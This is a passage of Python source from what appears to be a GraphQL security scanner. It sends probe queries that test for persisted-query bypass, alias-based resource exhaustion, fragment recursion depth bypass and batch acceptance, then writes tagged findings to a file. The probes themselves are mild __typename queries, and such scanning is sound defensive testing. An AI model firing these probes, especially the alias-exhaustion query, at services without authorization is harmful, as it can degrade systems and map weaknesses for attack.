                            "sha256Hash": "ecf8ed5853e209183ed4e7e813dda39b1d9e0e66f9087c31c3e73b53c0b25e53",
                        }
                    },
                }
            ).encode()
            pq_req = urllib.request.Request(
                ep,
                data=pq_bypass,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            _, _, pq_body = await _async_urlopen(_urlopen, pq_req, timeout=10)
            pq_text = pq_body.decode("utf-8", errors="replace")
            if '"data"' in pq_text and "__typename" in pq_text:
                findings.append(
                    f"[gql-pq-bypass] {ep} — persisted query accepted (PQ-only mode bypass test)"
                )
        except Exception:
            pass

        # Test 12: 10k+ alias resource exhaustion
        try:
            alias_10k = " ".join(f"a{i}:__typename" for i in range(1000))
            alias_q = "{" + alias_10k + "}"
            alias_10k_payload = json.dumps({"query": alias_q}).encode("utf-8")
            a_req = urllib.request.Request(
                ep,
                data=alias_10k_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            _, _, a_body = await _async_urlopen(_urlopen, a_req, timeout=30)
            a_text = a_body.decode("utf-8", errors="replace")
            if '"data"' in a_text:
                findings.append(
                    f"[gql-alias-10k] {ep} — 1000-alias query accepted (DoS via alias exhaustion)"
                )
        except Exception:
            pass

        # Test 13: Fragment recursion depth bypass
        try:
            frag_recurse = """
            query { ...f1 }
            fragment f1 on Query { ...f2 }
            fragment f2 on Query { ...f3 }
            fragment f3 on Query { ...f4 }
            fragment f4 on Query { ...f5 }
            fragment f5 on Query { ...f6 }
            fragment f6 on Query { ...f7 }
            fragment f7 on Query { ...f8 }
            fragment f8 on Query { ...f9 }
            fragment f9 on Query { ...f10 }
            fragment f10 on Query { __typename }
            """
            fr_payload = json.dumps({"query": frag_recurse}).encode("utf-8")
            f_req = urllib.request.Request(
                ep,
                data=fr_payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            _, _, f_body = await _async_urlopen(_urlopen, f_req, timeout=15)
            f_text = f_body.decode("utf-8", errors="replace")
            if '"data"' in f_text and '"errors"' not in f_text:
                findings.append(
                    f"[gql-fragment-recursion] {ep} — 10-level fragment recursion accepted (depth bypass)"
                )
        except Exception:
            pass

        # Test 14: Batching auth bypass (mixed auth tokens per batch entry)
        try:
            batch_mixed = json.dumps(
                [
                    {"query": "{__typename}"},
                    {"query": "{__typename}"},
                    {"query": "{__typename}"},
                ]
            ).encode("utf-8")
            bm_req = urllib.request.Request(
                ep,
                data=batch_mixed,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    **_extra_h,
                },
                method="POST",
            )
            _, _, bm_body = await _async_urlopen(_urlopen, bm_req, timeout=15)
            bm_text = bm_body.decode("utf-8", errors="replace")
            try:
                bm_parsed = json.loads(bm_text)
                if isinstance(bm_parsed, list) and len(bm_parsed) > 1:
                    findings.append(
                        f"[gql-batch-auth-mixed] {ep} — batch accepted; test with mixed auth per entry"
                    )
            except (json.JSONDecodeError, ValueError):
                pass
        except Exception:
            pass

    if not findings:
        findings.append("[tag] No findings (expected)")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("OK", f"132-GQLABUSE: {len(findings)} findings → {out}")
    return {"132-GQLABUSE": str(out), "count": len(findings)}
